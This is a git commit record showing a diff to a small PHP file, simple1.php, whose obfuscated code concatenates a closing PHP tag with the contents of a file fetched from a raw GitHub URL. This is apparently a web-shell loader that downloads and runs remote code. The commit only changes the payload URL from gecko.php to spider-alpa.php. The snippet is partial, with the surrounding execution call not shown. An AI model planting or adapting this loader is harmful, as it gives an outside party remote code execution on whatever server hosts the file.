8417c5818b56c1e046cf21585fae882b94ebf4bd
onlyme1d <agungrikardo09@gmail.com>
2025-12-18 17:30:48 +0700

    Update and rename simple88.php to simple1.php

--- simple1.php
+++ simple1.php
@@ -2,7 +2,7 @@
     /_/ urldecode("%3f%3e") .
         file_get_contents(
             /_/ urldecode(
-                /_/ "https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/gecko.php"
+                /_/ "https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/spider-alpa.php"
             )
         )
 ); 
